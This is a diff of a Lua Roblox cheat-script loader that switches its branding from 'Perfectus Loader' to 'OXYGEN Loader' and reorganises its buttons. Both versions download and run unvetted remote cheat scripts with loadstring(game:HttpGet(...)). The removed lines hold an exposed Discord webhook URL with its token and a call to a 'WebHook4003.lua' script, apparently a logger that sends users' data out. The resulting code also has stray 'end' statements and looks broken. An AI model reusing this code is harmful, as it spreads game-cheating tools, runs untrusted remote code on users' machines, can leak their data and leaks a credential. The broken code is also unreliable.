@@ -1,8 +1,8 @@
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
 
 local Window = Rayfield:CreateWindow({
-	Name = "Perfectus Loader",
-	LoadingTitle = "Perfectus Loader",
+	Name = "OXYGEN Loader",
+	LoadingTitle = "OXYGEN Loader",
 	LoadingSubtitle = "by Perfectus",
 	ConfigurationSaving = {
 		Enabled = true,
@@ -14,107 +14,87 @@ local Window = Rayfield:CreateWindow({
         	Invite = "dwuSS95ecF", -- The Discord invite code, do not include discord.gg/
         	RememberJoins = true -- Set this to false to make them join the discord every time they load it up
         },
-	KeySystem = false, -- Set this to true to use our key system
+	KeySystem = true, -- Set this to true to use our key system
 	KeySettings = {
-		Title = "OXYGEN HUB",
+		Title = "OXYGEN Hub",
 		Subtitle = "Key System",
-		Note = "Join the discord (discord.gg/dwuSS95ecF)",
+		Note = "Join the discord (discord.gg/37NZHy9gW3)",
 		FileName = "SiriusKey",
 		SaveKey = false,
 		GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-		Key = "key"
+		Key = "FuckYouRoblox"
 	}
 })
 
-getgenv().WebhookHere = "https://discord.com/api/webhooks/1060612260545970236/rnjy6vC6a9qOfyeGYBha4SGrrh0jq8iAXefX7LrTj6KsTX2um7810fxRSVdTkjvO4PEB"
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+local Tab = Window:CreateTab("Script Loader", 4483362458) -- Title, Image
 
-local Tab = Window:CreateTab("Script", 4483362458) -- Title, Image
-Tab:CreateLabel("If the game does not support the script will not work.")
 local Button = Tab:CreateButton({
-	Name = "Load Script",
-	Interact = "Load It!!!",
-	Callback = function()
-if game.PlaceId == 9264596435 then --Idle Heroes Simulator
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/main/Inferno%20X%20Scripts/Games/Idle%20Heroes%20Simulator.lua",true))();
---One Fruit Simulator	     
-elseif game.PlaceId == 11445923563 then
-           loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/main/Inferno%20X%20Scripts/Games/One%20Fruit%20Simulator.lua",true))();
-           
---Legends Of Speed
-elseif game.PlaceId == 3101667897 then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/Legends%20Of%20Speed%20Script%20Obfuscated.exe", true))();
-       
---Pickaxe Mining Simulator
-elseif game.PlaceId == 10821317529 then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/main/Inferno%20X%20Scripts/Games/Pickaxe%20Mining%20Simulator.lua", true))();
+   Name = "L Hub",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/vabalata1/L-HUB/main/L-HUB"))()
+   end,
+})
 
---Build a Boat
-elseif game.PlaceId == 537413528 then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/New%20BABFT",true))();
+local Button = Tab:CreateButton({
+   Name = "Universal",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/vabalata1/L-HUB/main/Universal"))()
+   end,
+})
 
---Anime Evolution Simulator
-elseif game.PlaceId == 10723695195 then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PerfectusMim/perfectusmims/main/Source",true))();
+Tab:CreateLabel("Game List L")
+Tab:CreateLabel("Anime Clicker Fight")
+Tab:CreateLabel("Anime Defence Simulator")
+Tab:CreateLabel("Dunking Simulator")
+Tab:CreateLabel("How Far Can You Backflip")
+Tab:CreateLabel("Monkey Tycoon")
+Tab:CreateLabel("Rebirth Champions")
+Tab:CreateLabel("Sword Fighters Simulator")
 
---Muscle Legends
-if game.PlaceId == 3623096087 then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/Muscle%20Legends%20V2%20Obfuscated%20lel.lua",true))();
+local Button = Tab:CreateButton({
+   Name = "İnferno HUB",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/main/Script%20Hub%20-%20Inferno%20X.lua"))()
+   end,
+})
 
+Tab:CreateLabel("Game List İnferno")
+Tab:CreateLabel("Idle Heroes Simulator")
+Tab:CreateLabel("Merge Simulator")
+Tab:CreateLabel("Timber Champions")
+Tab:CreateLabel("One Fruit Simulator")
+Tab:CreateLabel("Pickaxe Mining Simulator")
 
---Anime Defence Simulator
-elseif game.PlaceId == 10875701453 then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/vabalata1/L-HUB/main/Anime%20Defense%20Simulator",true))();
-elseif game.PlaceId == 11885022882 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/vabalata1/L-HUB/main/Anime%20Defense%20Simulator",true))();
+local Button = Tab:CreateButton({
+   Name = "Rolly HUB",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/main/Script%20Hub%20-%20Inferno%20X.lua"))()
+   end,
+})
 
+Tab:CreateLabel("Game List Rolly")
+Tab:CreateLabel("Mining Simulator 2")
+Tab:CreateLabel("Muscle Legends")
+Tab:CreateLabel("BUILD A BOAT FOR TREASURE")
+Tab:CreateLabel("Break In X")
+Tab:CreateLabel("Legends Of Speed.exe")
+Tab:CreateLabel("Ninja Legends")
+Tab:CreateLabel("Victory Race")
+Tab:CreateLabel("Farm Factory Tycoon")
+Tab:CreateLabel("Race Clicker")
+Tab:CreateLabel("Training Simulator")
+Tab:CreateLabel("Card Ride Around Nothing")
+Tab:CreateLabel("Slime Tower Tycoon")
+Tab:CreateLabel("Vehicle Legends")
+Tab:CreateLabel("Edward The Man Eating Train...")
+Tab:CreateLabel("Mo's Academy")
+Tab:CreateLabel("Monkey Tycoon")
+Tab:CreateLabel("Every Second You Get 1+ Damage")
+Tab:CreateLabel("Anime Clicker Fight")
+Tab:CreateLabel("Anime Fruit Simulator")
 
---Every Second You Get 1+ Damage
-elseif game.PlaceId == 11495558803 then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/Every%20Second%20You%20Get%201%2B%20Damage%20GUI.lua", true))();
-
---Anime Fruit Simulator
-elseif game.PlaceId == 10446125875 then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/Anime%20Fruit%20Simulator.lua", true))();
-    
-    
---Ninja Legends
-elseif game.PlaceId == 3956818381 then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/Ninja-Legenos.exe.lua",true))();
-end
-   end
+  end
     wait(1)
     Rayfield:Destroy()
 end,
 })
-
-local Tab2 = Window:CreateTab("Game List", 4483362458)
-
-Tab2:CreateLabel("Anime Fruit Simulator")
-
-Tab2:CreateLabel("Anime Defence Simulator")
-
-Tab2:CreateLabel("Every Second You Get 1+ Damage")
-
-Tab2:CreateLabel("Legends Of Speed")
-
-Tab2:CreateLabel("BUILD A BOAT FOR TREASURE")
-
-Tab2:CreateLabel("Muscle Legends")
-
-Tab2:CreateLabel("Ninja Legends")
-
-Tab2:CreateLabel("Anime Evolution Simulator")
-
-Tab2:CreateLabel("Mining Simulator 2")
-
-Tab2:CreateLabel("One Fruit Simulator")
-
-Tab2:CreateLabel("Idle Heroes Simulator")
-
-Tab2:CreateLabel("Anime Evolution Simulator")
-
-Tab2:CreateLabel("Pickaxe Mining Simulator")
-
-
